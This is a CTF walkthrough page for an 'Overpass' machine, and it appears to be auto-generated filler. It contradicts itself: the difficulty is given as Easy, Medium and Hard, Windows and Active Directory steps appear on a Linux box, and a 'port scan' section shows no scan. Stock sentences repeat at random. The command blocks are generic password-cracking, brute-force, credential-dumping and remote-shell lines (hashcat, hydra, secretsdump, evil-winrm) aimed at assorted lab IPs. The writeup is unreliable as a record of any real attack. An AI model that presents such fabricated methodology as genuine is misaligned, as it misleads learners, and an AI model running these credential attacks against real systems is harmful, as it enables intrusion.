---
TitleSEO: "PwnTillDawn — Overpass (Insane Linux) | ZureFX"
TitlePost: "PwnTillDawn — Overpass (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Overpass. CSRF and Remote Code Execution to achieve insane compromise on Linux."
Keywords: "easy, ctf, linux, medium, hackthebox, hard"
URL: "https://zurefx.github.io/writeups/htb-overpass-224.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-overpass-224/"
Date: "2024-09-17"
Tags: "Easy, CTF, Linux, Medium, HackTheBox, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-overpass-224"
Permalink: "/writeups/htb-overpass-224.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Overpass** is rated **Insane** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.39.68.235`.

### Objectives

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.114.19.154 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.103.159.81/FUZZ
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit.

### Service Enumeration

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

### SMB Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.59.249.92
crackmapexec smb 10.54.181.60 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.81.232.94
```

The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services.

## Exploitation

### Vulnerability Identification

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit.

Key finding: **Remote Code Execution**.

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Initial Access

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
gobuster dir -u http://10.61.217.199/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

## Privilege Escalation

### Enumeration

The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.110.140.226 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.72.178.153/FUZZ
crackmapexec smb 10.31.180.80 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.74.120.12/FUZZ
crackmapexec smb 10.108.163.23 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.102.240.253 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.72.14.186
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

## Summary

### Tools Used

- `sharphound`
- `nikto`
- `secretsdump`
- `metasploit`
- `ldapsearch`
- `evil-winrm`

### Key Takeaways

- CSRF
- Remote Code Execution
